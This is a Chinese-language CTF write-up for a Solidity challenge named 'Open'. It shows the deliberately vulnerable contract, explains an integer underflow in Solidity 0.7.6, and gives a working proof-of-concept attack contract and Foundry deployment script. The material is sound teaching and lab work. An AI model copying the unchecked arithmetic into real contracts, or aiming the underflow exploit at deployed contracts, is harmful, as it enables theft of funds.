# Open

# 源码

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.7.6;

import {Open} from "./Open.sol";

contract Setup {
    Open public open;
    bool public solved;
    address private deployer;

    constructor() payable {
        open = new Open(123456789, 987654321);
        deployer = msg.sender;
    }

    function getInstance() external view returns (address) {
        return address(open);
    }

    function isSolved() external returns (bool) {
        if (open.solved()) {
            solved = true;
        }
        return solved;
    }
}

// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.7.6;

import {Setup} from "./setup.sol";

contract Open {
    bool private attend;
    bool private stay;
    bool public solved;
    bool public keyused;
    uint256 private key;
    uint256 private fakekey;
    mapping(address => uint256) public Attraction;

    constructor(uint256 _key, uint256 _fakekey) {
        key = _key;
        fakekey = _fakekey;
    }

    function open() external {
        require(Attraction[msg.sender] >= 99999, "Your Attraction is not enough to open!");
        solved = true;
    }

    function goodkey(uint256 _key) external {
        if (_key == key) {
            require(!keyused,"just one chance!");
            keyused=true;
            Attraction[msg.sender] += 9999;
        } else {
            Attraction[msg.sender] = 0; // be careful
        }
    }

    function PlayWithNailong() external {
        require(!attend, "just 1 chance!");
        attend = true;
        Attraction[msg.sender] += 1;
    }

    function StayWithNailong() public {
        require(!stay, "just 1 chance!!");
        stay = true;
        Attraction[msg.sender] += 1;
    }

    function FightWithNailong() public {
        require(stay && attend, "Why don't try?");
        Attraction[msg.sender] -= 1;
    }
}


```

# wp

源码里solved的条件是`Attraction[msg.sender] >= 99999`，即奶龙对你的好感度大于等于99999

观察几个函数，发现`PlayWithNailong()`和`StayWithNailong()`两个函数调用一次可以+1好感度,但是都有bool锁,每个只能调用一次,最多只能得到2好感度

还有一个减好感度的函数`FightWithNailong()`，调用的条件是之前调用过前面那两个增加好感度的函数，如果符合就-1好感度。

题目要求的99999很大，通过常规加减是肯定达不到的，这个时候我们可以想到溢出漏洞。源码的solidity版本是0.7.6，正好符合在0.8以下这个条件 ，那么思路就有了，我们可以利用减好感度的函数`FightWithNailong()`来构成下溢，从而满足solved条件。

构造思路时注意函数条件：

1. 调用`PlayWithNailong()`，好感度0+1=1
2. 调用`StayWithNailong()`，好感度1+1=2
3. 调用`FightWithNailong()`，好感度此时 2-1=1，还需要继续重复调用此函数
4. 第二次调用`FightWithNailong()`,好感度1-1=0，还需要继续重复调用此函数
5. 第三次调用`FightWithNailong()`，好感度0-1发生下溢，变成超级大的数，必定大于99999，此时就满足了solved条件

# poc

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.7.6;

import {Open} from "./Open.sol";
import {Setup} from "./setup.sol";

contract Attack {
    Open open;
    Setup setup;

    constructor(address _addr) {
        open = Open(_addr);
    }

    function attack() external {
        open.PlayWithNailong();
        open.StayWithNailong();
        open.FightWithNailong();
        open.FightWithNailong();
        open.FightWithNailong();

        open.open();
    }
}
```

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.7.6;

import {Open} from "../src/Open.sol";
import {Setup} from "../src/setup.sol";
import {Attack} from "../src/1.sol";
import {Script} from "../lib/forge-std/src/Script.sol";

contract Attacksc is Script {
    Attack attack;

    function run() external {
        vm.startBroadcast();
        Setup setup = Setup(0xSETUP_ADDRESS);
        attack = new Attack(setup.getInstance());
        attack.attack();
        vm.stopBroadcast();
    }
}

```


> 更新: 2026-03-16 18:30:17  
> 原文: <https://www.yuque.com/xiaoyuhushenfu/yzin4n/sss8g7rhi8a2fgzz>